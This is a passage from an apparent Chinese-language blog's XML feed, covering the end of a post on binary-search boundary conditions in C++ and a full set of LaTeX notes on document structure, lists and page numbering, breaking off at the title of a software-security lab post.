class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> r1<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> l1 <span class="token operator">+</span> r1 <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> qq<span class="token punctuation">)</span> l1 <span class="token operator">=</span> mid<span class="token punctuation">;</span>            <span class="token keyword">else</span> r1 <span class="token operator">=</span> mid<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> l1<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* 暴力o(n^2)        //cout &lt;&lt; qq;        int l=-1,r=-1;        for (int j = 0; j &lt; n; j ++ )        {            if (num[j] &gt;= qq)            {                if (num[j] == qq) l = j;                else l = -1;                break;            }        }         for (int j = n-1; j &gt; -1; j -- )        {            if (num[j] &lt;= qq)            {                if (num[j] == qq) r = j;                else r = -1;                break;            }        }        printf("%d %d\n",l,r);        */</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>35行定为左闭右开 [l1,r1)，故循环判断需为 l1 + 1 &lt; r1。为什么得这样设置？因为如果左闭右闭，判断循环会变成 l1 &lt; r1，这种不适用，寻找答案在左端，并且左端更新不能赋值mid+1的情况(寻找最右端的正确答案)，这个时候如果右端-左端=1，即区间大小为2，即 l1+1 = r1 ，mid = l1，会陷入一直死循环(因为这个时候mid永远等于左端即 mid = l1，然后 l1有符合条件一直循环)。所以左闭右开 [l1,r1)可以解决当 l1+1 = r1，然后mid = l1，再更新只能是 l1 = mid，不能是 l1 = mid + 1的情况。</p><p>当然也可以直接修改 “l1+1 = r1，然后mid = l1，再更新只能是 l1 = mid，不能是 l1 = mid + 1”这里面的一种情况使得左闭右闭不会循环，那就是使得mid = r1就行了，并竟左闭右闭时r1更新是 r1= mid-1，只需要mid = l1 + r1 + 1 &gt;&gt; 1即可。如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">&lt;</span> r1<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> l1 <span class="token operator">+</span> r1 <span class="token operator">+</span> <span class="token number">1</span><span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> qq<span class="token punctuation">)</span> l1 <span class="token operator">=</span> mid<span class="token punctuation">;</span>    <span class="token keyword">else</span> r1 <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此类二分保证不死循环，保证左端+1=右端时，mid所在的那一端符合更新条件时不能自我更新(mid所在的那一端 = mid)，而是mid-1或者mid+1 赋值给那一端，可以通过修改mid所在另一端或者一端由闭区间改开区间则不会出现左端+1=右端情况出现即可</p><h2 id="参考题解"><a href="#参考题解" class="headerlink" title="参考题解"></a>参考题解</h2><p><a href="https://www.acwing.com/solution/content/3338/">参考题解</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 二分 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 二分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaTex写论文阅读笔记_文档结构</title>
      <link href="/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/"/>
      <url>/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/</url>
      
        <content type="html"><![CDATA[<h2 id="文档结构"><a href="#文档结构" class="headerlink" title="文档结构"></a>文档结构</h2><h3 id="基本要素"><a href="#基本要素" class="headerlink" title="基本要素"></a>基本要素</h3><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>a4paper,12pt<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span>A sentence of text.<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>\documentclass</code> 命令必须出现在每个 LaTeX 文档的开头。花括号内的文本指定了文档的类型。<strong>article</strong> 文档类型适合较短的文章，比如期刊文章和短篇报告。其他文档类型包括 <strong>report</strong>（适用于更长的多章节的文档，比如博士生论文），<strong>proc</strong>（会议论文集），<strong>book</strong> 和 <strong>beamer</strong>。方括号内的文本指定了一些选项——示例中它设置纸张大小为 A4，主要文字大小为 12pt。</p><p><code>\begin{document}</code> 和 <code>\end{document}</code> 命令将你的文本内容包裹起来。任何在 <code>\begin{documnet}</code> 之前的文本都被视为前导命令，会影响整个文档。任何在 <code>\end{document}</code> 之后的文本都会被忽视。</p><p>空行不是必要的，但它可以让长的文档更易读。</p><h3 id="添加文档标题"><a href="#添加文档标题" class="headerlink" title="添加文档标题"></a>添加文档标题</h3><p><code>\maketitle</code> 命令可以给文档创建标题。你需要指定文档的标题。如果没有指定日期，就会使用现在的时间，作者是可选的。</p><p>在 <code>\begin{document}</code> 和 命令后紧跟着输入以下文本：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\title</span><span class="token punctuation">{</span>My First Document<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>My Name<span class="token punctuation">}</span><span class="token function selector">\date</span><span class="token punctuation">{</span><span class="token function selector">\today</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>你的文档现在长成了这样：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>a4paper,12pt<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\title</span><span class="token punctuation">{</span>My First Document<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>My Name<span class="token punctuation">}</span><span class="token function selector">\date</span><span class="token punctuation">{</span><span class="token function selector">\today</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span>A sentence of text.<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要点笔记：</p><ul><li><code>\today</code> 是插入当前时间的命令。你也可以输入一个不同的时间，比如 <code>\date{November 2013}</code>。</li><li><strong>article</strong> 文档的正文会紧跟着标题之后在同一页上排版。<strong>report</strong> 会将标题置为单独的一页。</li></ul><h3 id="章节"><a href="#章节" class="headerlink" title="章节"></a>章节</h3><p>如果需要的话，你可能想将你的文档分为章（Chatpers）、节（Sections）和小节（Subsections）。下列分节命令适用于 <strong>article</strong> 类型的文档：</p><ul><li><code>\section{...}</code></li><li><code>\subsection{...}</code></li><li><code>\subsubsection{...}</code></li><li><code>\paragraph{...}</code></li><li><code>\subparagraph{...}</code></li></ul><p>花括号内的文本表示章节的标题。对于 <strong>report</strong> 和 <strong>book</strong> 类型的文档我们还支持 <code>\chapter{...}</code> 的命令。</p><p>将 “A sentence of text.” 替换为以下文本：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Introduction</span><span class="token punctuation">}</span>This is the introduction.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Methods</span><span class="token punctuation">}</span><span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 1</span><span class="token punctuation">}</span>The first part of the methods.<span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 2</span><span class="token punctuation">}</span>The second part of the methods.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Results</span><span class="token punctuation">}</span>Here are my results.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你的文档会变成</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>a4paper,12pt<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\title</span><span class="token punctuation">{</span>My First Document<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>My Name<span class="token punctuation">}</span><span class="token function selector">\date</span><span class="token punctuation">{</span><span class="token function selector">\today</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span><span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Introduction</span><span class="token punctuation">}</span>This is the introduction.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Methods</span><span class="token punctuation">}</span><span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 1</span><span class="token punctuation">}</span>The first part of the methods.<span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 2</span><span class="token punctuation">}</span>The second part of the methods.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Results</span><span class="token punctuation">}</span>Here are my results.<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成PDF 文档。应该是长这样的</p><p><img src="/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/image-20231021160318989.png"></p><h3 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h3><p>你可以对任意章节命令创建标签，这样他们可以在文档的其他部分被引用。使用 <code>\label{labelname}</code> 对章节创建标签。然后输入 <code>\ref{labelname}</code> 或者 <code>\pageref{labelname}</code> 来引用对应的章节。</p><p>在 <code>\subsection{Stage 1}</code> 下面另起一行，输入 <code>\label{sec1}</code>。<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="\rightarrow"> 在 <strong>Results</strong> 章节输入 <code>Referring to section \ref{sec1} on page \pageref{sec1}</code>。</p><p>你的文档会变成这样：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>a4paper,12pt<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\title</span><span class="token punctuation">{</span>My First Document<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>My Name<span class="token punctuation">}</span><span class="token function selector">\date</span><span class="token punctuation">{</span><span class="token function selector">\today</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span><span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Introduction</span><span class="token punctuation">}</span>This is the introduction.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Methods</span><span class="token punctuation">}</span><span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 1</span><span class="token punctuation">}</span><span class="token function selector">\label</span><span class="token punctuation">{</span><span class="token keyword">sec1</span><span class="token punctuation">}</span>The first part of the methods.<span class="token function selector">\subsection</span><span class="token punctuation">{</span><span class="token headline class-name">Stage 2</span><span class="token punctuation">}</span>The second part of the methods.<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">Results</span><span class="token punctuation">}</span>Here are my results. Referring to section <span class="token function selector">\ref</span><span class="token punctuation">{</span><span class="token keyword">sec1</span><span class="token punctuation">}</span> on page <span class="token function selector">\pageref</span><span class="token punctuation">{</span>sec1<span class="token punctuation">}</span><span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译并检查 PDF 文档（可能需要连续编译两次）</p><p><img src="/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/image-20231021161758048.png"></p><p>在LaTeX中，创建标签（或者说标记）是为了能够在文档中引用特定位置或对象的标识符。标签可以用于交叉引用、引用图表、公式、章节等内容，以及创建内部链接和目录。</p><p>以下是一些使用标签的常见场景和用途：</p><ol><li><p>交叉引用：标签允许你在文档的其他位置引用特定内容。例如，在文中引用某个章节、图表或公式，可以使用<code>\label{}</code>命令为其创建一个标签，然后使用<code>\ref{}</code>命令在其他位置引用该标签所关联的内容。</p></li><li><p>引用图表和公式：使用标签可以方便地引用文档中的图表和公式。通过为图表和公式添加标签，你可以使用<code>\ref{}</code>命令在文中其他位置引用它们，而不需要手动编写相应的编号。</p></li><li><p>创建内部链接：你可以使用标签创建内部链接，以便读者可以点击链接跳转到文档的其他位置。这可以增加文档的可导航性和易读性。标签可以与<code>\hyperref[]</code>命令结合使用，创建包含链接的文字或图标，在使用<code>\hyperref[]</code>命令时，它会自动创建一个超链接，指向标签所在位置。你可以在文本中的任何位置使用<code>\hyperref[]</code>命令，以创建链接到其他部分的超链接。</p><p>请注意，使用<code>\hyperref[]</code>命令之前，通常需要对文档进行多次编译，以确保超链接被正确解析和显示。</p></li></ol><p>总之，标签是在LaTeX文档中定义和引用特定位置或对象的一种方式。它们提供了方便的跳转和引用机制，使得文档结构更加清晰、易于导航和引用。</p><h3 id="生成目录（TOC）"><a href="#生成目录（TOC）" class="headerlink" title="生成目录（TOC）"></a>生成目录（TOC）</h3><p>如果你使用分节命令，那么可以容易地生成一个目录。使用 <code>\tableofcontents</code> 在文档中创建目录。通常我们会在标题的后面建立目录。</p><p>你可能也想也想更改页码为罗马数字（i,ii,iii）。这会确保文档的正文从第 1 页开始。页码可以使用 <code>\pagenumbering{...}</code> 在阿拉伯数字和罗马数字见切换。</p><p>在 <code>\maketitle</code> 之后输入以下内容：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>roman<span class="token punctuation">}</span><span class="token function selector">\tableofcontents</span><span class="token function selector">\newpage</span><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>arabic<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>\newpage</code> 命令会另起一个页面，这样我们就可以看到 <code>\pagenumbering</code> 命令带来的影响了。你的文档的前 14 行长这样：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>a4paper,12pt<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\title</span><span class="token punctuation">{</span>My First Document<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>My Name<span class="token punctuation">}</span><span class="token function selector">\date</span><span class="token punctuation">{</span><span class="token function selector">\today</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>roman<span class="token punctuation">}</span><span class="token function selector">\tableofcontents</span><span class="token function selector">\newpage</span><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>arabic<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/image-20231021182141620.png"></p><p>第二页：</p><p><img src="/2023/10/21/latex-xie-lun-wen-yue-du-bi-ji-wen-dang-jie-gou/image-20231021182212262.png"></p><h3 id="itemize环境列举无序项目列表"><a href="#itemize环境列举无序项目列表" class="headerlink" title="itemize环境列举无序项目列表"></a>itemize环境列举无序项目列表</h3><p>在 LaTeX 中，可以使用 <code>itemize</code> 环境来创建项目列表。<code>itemize</code> 环境会自动为每个项目生成一个项目符号，并将它们垂直对齐。</p><p>下面是一个示例，展示了如何使用 <code>itemize</code> 环境创建一个简单的项目列表：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">itemize</span><span class="token punctuation">}</span>  <span class="token function selector">\item</span> 第一项  <span class="token function selector">\item</span> 第二项  <span class="token function selector">\item</span> 第三项<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">itemize</span><span class="token punctuation">}</span><span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用了 <code>itemize</code> 环境，并在其中列举了三个项目。每个项目都使用 <code>\item</code> 命令开始，后面是项目的内容。</p><p>当你编译这个示例时，LaTeX 会生成一个带有项目符号的垂直列表，如下所示：</p><ul><li>第一项</li><li>第二项</li><li>第三项</li></ul><p>你可以根据需要添加或删除项目，<code>itemize</code> 环境会自动调整项目符号和对齐方式。</p><p>除了默认的项目符号（通常是一个实心圆点），你还可以通过自定义 <code>itemize</code> 环境的样式进行更改。例如，你可以使用 <code>\renewcommand</code> 命令来重新定义项目符号的样式。以下是一个示例，演示如何将项目符号更改为破折号：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\renewcommand</span><span class="token punctuation">{</span><span class="token function selector">\labelitemi</span><span class="token punctuation">}</span><span class="token punctuation">{</span>--<span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">itemize</span><span class="token punctuation">}</span>  <span class="token function selector">\item</span> 第一项  <span class="token function selector">\item</span> 第二项  <span class="token function selector">\item</span> 第三项<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">itemize</span><span class="token punctuation">}</span><span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用 <code>\renewcommand</code> 重新定义了 <code>\labelitemi</code> 命令，将项目符号更改为破折号。可以根据需要调整样式。</p><h3 id="enumerate环境列举有序项目列表"><a href="#enumerate环境列举有序项目列表" class="headerlink" title="enumerate环境列举有序项目列表"></a>enumerate环境列举有序项目列表</h3><p>前者<code>itemize</code>：用于创建无序项目列表，每个项目通常以实心圆点作为项目符号。enumerate用于创建有序项目列表，每个项目通常以数字作为项目符号。</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">enumerate</span><span class="token punctuation">}</span>  <span class="token function selector">\item</span> 第一项  <span class="token function selector">\item</span> 第二项  <span class="token function selector">\item</span> 第三项<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">enumerate</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="description-环境描述性列表"><a href="#description-环境描述性列表" class="headerlink" title="description 环境描述性列表"></a>description 环境描述性列表</h3><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">description</span><span class="token punctuation">}</span>  <span class="token function selector">\item</span><span class="token punctuation">[</span>项目一<span class="token punctuation">]</span> 这是项目一的描述。  <span class="token function selector">\item</span><span class="token punctuation">[</span>项目二<span class="token punctuation">]</span> 这是项目二的描述。  <span class="token function selector">\item</span><span class="token punctuation">[</span>项目三<span class="token punctuation">]</span> 这是项目三的描述。<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">description</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>description</code> 环境中，项目符号通常是项目的标题或标签，而不是简单的符号或数字。每个项目都可以用方括号包围的文本来定义项目符号。</p><h3 id="页码设置相关的命令"><a href="#页码设置相关的命令" class="headerlink" title="页码设置相关的命令"></a>页码设置相关的命令</h3><p>在LaTex中，与页码和页面设置相关的命令有\pagestyle{type}，\thispagestyle{type}，setcounter{page}{number}，\pagenumbering{style}。<br>\pagestyle{type}和\thispagestyle{type}命令用于设置页面样式（页眉和页脚）。\pagestyle{type}和\thispagestyle{type}的主要区别在于\pagestyle{type}对后续所有页面都有效，而\thispagestyle{type}仅仅对当前页面有效。在LaTeX中，默认提供了以下四种页面样式：</p><ul><li>empty - 没有页眉和页脚</li><li>plain - 没有页眉，页脚包含一个居中的页码</li><li>headings - 没有页脚，页眉包含章/节或者字节的名字和页码，可以使用 <code>\pagestyle{headings}</code> 命令来启用这个页面风格。</li><li>myheadings - 没有页脚，页眉包含有页码可以使用 <code>\markboth{left}{right}</code> 命令来设置自定义的页眉内容，并使用 <code>\pagestyle{myheadings}</code> 命令来启用这个页面风格。</li></ul><p>你想在每一页的底部中央显示页码，可以在文档的导言区添加以下命令：</p><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\pagestyle</span><span class="token punctuation">{</span>plain<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认情况下，页码从第一页开始（通常是包含标题页的）并且以阿拉伯数字形式显示（例如：1，2，3 …）。页码的编号也可以通过\setcounter{page}{number}命令手动设置，需要注意的是，手动设置可能会导致重复的页码出现。<br>\pagenumbering{style}命令则用于改变页码的显示风格。LaTeX中页码风格包含以下五类：</p><ul><li>arabic - 阿拉伯数字</li><li>roman - 小写的罗马数字</li><li>Roman - 大写的罗马数字</li><li>alph - 小写的字符形式</li><li>Alph -大写的字符形式</li></ul><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">{</span><span class="token keyword">article</span><span class="token punctuation">}</span><span class="token function selector">\usepackage</span><span class="token punctuation">{</span><span class="token keyword">fontspec, xunicode, xlextra</span><span class="token punctuation">}</span><span class="token function selector">\usepackage</span><span class="token punctuation">{</span><span class="token keyword">xeCJK</span><span class="token punctuation">}</span><span class="token function selector">\title</span><span class="token punctuation">{</span><span class="token function selector">\LaTeX</span> 页码设置<span class="token punctuation">}</span><span class="token function selector">\author</span><span class="token punctuation">{</span>Japinli<span class="token punctuation">}</span><span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span class="token function selector">\maketitle</span><span class="token function selector">\thispagestyle</span><span class="token punctuation">{</span>empty<span class="token punctuation">}</span> <span class="token comment">% 当前页不显示页码</span><span class="token function selector">\newpage</span><span class="token function selector">\pagestyle</span><span class="token punctuation">{</span>headings<span class="token punctuation">}</span><span class="token function selector">\setcounter</span><span class="token punctuation">{</span>page<span class="token punctuation">}</span><span class="token punctuation">{</span>1<span class="token punctuation">}</span><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>Roman<span class="token punctuation">}</span><span class="token function selector">\section*</span><span class="token punctuation">{</span><span class="token headline class-name">前言</span><span class="token punctuation">}</span>学习如何在<span class="token function selector">\LaTeX</span> 中设置页码。<span class="token function selector">\newpage</span><span class="token function selector">\tableofcontents</span><span class="token function selector">\newpage</span><span class="token function selector">\setcounter</span><span class="token punctuation">{</span>page<span class="token punctuation">}</span><span class="token punctuation">{</span>1<span class="token punctuation">}</span><span class="token function selector">\pagenumbering</span><span class="token punctuation">{</span>arabic<span class="token punctuation">}</span><span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">页码风格</span><span class="token punctuation">}</span><span class="token function selector">\LaTeX</span> 中包含五种页码风格，分别是<span class="token function selector">\emph</span><span class="token punctuation">{</span>arabic<span class="token punctuation">}</span>，<span class="token function selector">\emph</span><span class="token punctuation">{</span>roman<span class="token punctuation">}</span>，<span class="token function selector">\emph</span><span class="token punctuation">{</span>Roman<span class="token punctuation">}</span>，<span class="token function selector">\emph</span><span class="token punctuation">{</span>alph<span class="token punctuation">}</span>和<span class="token function selector">\emph</span><span class="token punctuation">{</span>Alph<span class="token punctuation">}</span>。<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">页码风格说明</span><span class="token punctuation">}</span><span class="token function selector">\emph</span><span class="token punctuation">{</span>arabic<span class="token punctuation">}</span>代表阿拉伯数字类型。<span class="token function selector">\emph</span><span class="token punctuation">{</span>roman<span class="token punctuation">}</span>代表小写的罗马数字类型。<span class="token function selector">\emph</span><span class="token punctuation">{</span>Roman<span class="token punctuation">}</span>代表大写的罗马数字类型。<span class="token function selector">\emph</span><span class="token punctuation">{</span>alph<span class="token punctuation">}</span>代表小写的字符类型。<span class="token function selector">\emph</span><span class="token punctuation">{</span>Alph<span class="token punctuation">}</span>代表大写的字符类型。<span class="token function selector">\section</span><span class="token punctuation">{</span><span class="token headline class-name">页码风格设置</span><span class="token punctuation">}</span>为了改变页码的风格，可以使用<span class="token function selector">\emph</span><span class="token punctuation">{</span><span class="token function selector">\textbackslash</span> pagenumbering<span class="token function selector">\{</span>sytle<span class="token function selector">\}</span><span class="token punctuation">}</span>命令设置。<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/japinli/article/details/51418977">本节参考</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://oi-wiki.org/tools/latex/">LaTeX 入门</a></p><p><a href="https://mdnice.com/writing/285dc7d7cfd54d89b0378b4e08e8c006">vs code 配置latex环境保姆级配置教程（双系统）</a></p><p><a href="https://zhuanlan.zhihu.com/p/110451310">MikTex + VS Code 配置教程</a></p><p><a href="https://www.writelatex.com/signup">在线latex 并生成pdf网站：writelatex</a></p>]]></content>
      
      
      <categories>
          
          <category> LaTex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LaTex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件安全实验_1</title>
      <link href="/2023/10/20/ruan-jian-an-quan-shi-yan-1/"/>
      <url>/2023/10/20/ruan-jian-an-quan-shi-yan-1/</url>
      
